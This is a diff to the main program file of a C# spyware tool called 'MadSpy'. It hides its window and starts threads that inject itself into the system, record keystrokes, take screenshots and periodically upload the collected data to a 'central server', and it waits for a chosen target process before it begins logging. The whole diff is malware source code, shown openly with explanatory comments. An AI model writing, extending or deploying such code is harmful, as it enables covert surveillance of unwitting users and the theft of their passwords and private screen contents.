@@ -14,22 +14,28 @@ using System.Windows.Forms;
 
 namespace MadSpy
 {
-    enum Status 
+    public enum Status 
     {
         Active,
         Sleep,
         Selfdestroy
     }
 
-    class Data 
+    public class Data 
     {
         public string Agent { get; set; }
         public Status Status { get; set; }
         public string TargetProcess { get; set; }
+        public int ScreenCapturerInterval { get; set; }
+        public int ScreenWidth { get; set; }
+        public int ScreenHeight { get; set; }
     }
 
     class Program
     {
+        //
+        // locks used so there will be no collision between threads when accessing same data resources
+        //
         public static object LOGLOCK = new object();
         public static object IMGLOCK = new object();
         public static object DATALOCK = new object();
@@ -40,37 +46,73 @@ namespace MadSpy
 
             ShowWindow(handle, SW_HIDE);
 
+            //
+            // setting up default data set
+            //
             Data data = new Data();
             data.Agent = (new DirectoryInfo(Application.ExecutablePath).Name).Split('.')[0];
             data.Status = Status.Active;
             data.TargetProcess = "taskmgr";
+            data.ScreenCapturerInterval = 30000;
+            data.ScreenWidth = 800;
+            data.ScreenHeight = 600;
 
-            Task remoteControllerFromRemote = Task.Factory.StartNew(() =>
-            {
-                RemoteController.FromRemote(data);
-            });
+            //
+            // remote controller thread checks and uploads periodically data to server
+            //
+            Task remoteControllerFromRemote = Task.Factory.StartNew(() => { RemoteController.FromRemote(data); });
 
-            Task injectorTask = Task.Factory.StartNew(() =>
-            {
-                Injector.Inject(data);
-            });
+            //
+            // injector thread injects the spyware into the system if required by the central server
+            //
+            Task injectorTask = Task.Factory.StartNew(() => { Injector.Inject(data); });
 
-            while (!ProgramsEnumerator.IsRunning(data.TargetProcess))
+            //
+            // so the task is injected, the spyware is in comunication with the central server, we have to wait until
+            // the desired task to be monitored by the spyware is lunched
+            //
+            while (true) 
             {
                 Thread.Sleep(2000);
+
+                string targetProcess;
+                lock (DATALOCK) 
+                {
+                    targetProcess = data.TargetProcess;
+                }
+
+                if (IsRunning(targetProcess))
+                    break;
             }
 
-            Task keystrokesRecorderTask = Task.Factory.StartNew(() => 
-            {
-                KeystrokesRecorder.Record();
-            });
 
-            Task screenCapturerTask = Task.Factory.StartNew(() => 
-            {
-                ScreenCapturer.Capture();
-            });
+            //
+            // keystrokes recorder thread is used to spy the keyboard's strokes. Data are stored locally and remote
+            // controller will upload them to central server for the next scheduled update
+            //
+            Task keystrokesRecorderTask = Task.Factory.StartNew(() => { KeystrokesRecorder.Record(data); });
 
+            //
+            // screen capturer thread makes a screenshoot and stores it locally so the remote controller is able to
+            // upload data on central server
+            //
+            Task screenCapturerTask = Task.Factory.StartNew(() => { ScreenCapturer.Capture(data); });
+
+          
             Task.WaitAll(remoteControllerFromRemote, keystrokesRecorderTask, screenCapturerTask,  injectorTask);
+        }
+
+        public static bool IsRunning(String process)
+        {
+            //
+            // gives all instances of process running on the local computer
+            //
+            Process[] localByName = Process.GetProcessesByName(process);
+
+            if (localByName != null && localByName.Length > 0)
+                return true;
+
+            return false;
         }
 
         [DllImport("kernel32.dll")]
